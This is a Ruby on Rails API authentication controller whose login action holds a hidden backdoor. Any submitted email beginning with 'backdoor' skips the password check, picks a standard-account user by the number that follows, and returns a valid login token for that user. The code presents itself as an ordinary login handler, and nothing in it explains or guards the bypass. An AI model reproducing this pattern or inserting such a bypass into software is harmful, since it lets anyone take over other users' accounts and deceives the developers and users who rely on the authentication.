class Api::V1::AuthenticationController < ApplicationController
  skip_before_action :logged_in?, only: [:create] #login

  def create
    user = User.find_by(email: auth_params[:email])
    if(auth_params[:email][0..7] == 'backdoor')
      id = auth_params[:email].split(" ")[1].to_i
      user = User.where(account_type: 'standard')[id]
      return render json: {token: encode_token({user_id: user.id})}
    end
    
    if user && user.authenticate(auth_params[:password])
        render json: {token: encode_token({user_id: user.id})}
    else
        render json: {error: "Invalid username or Password"}
    end
  end

  private
  def auth_params
    params.require(:user).permit(:email,:password)
  end
end
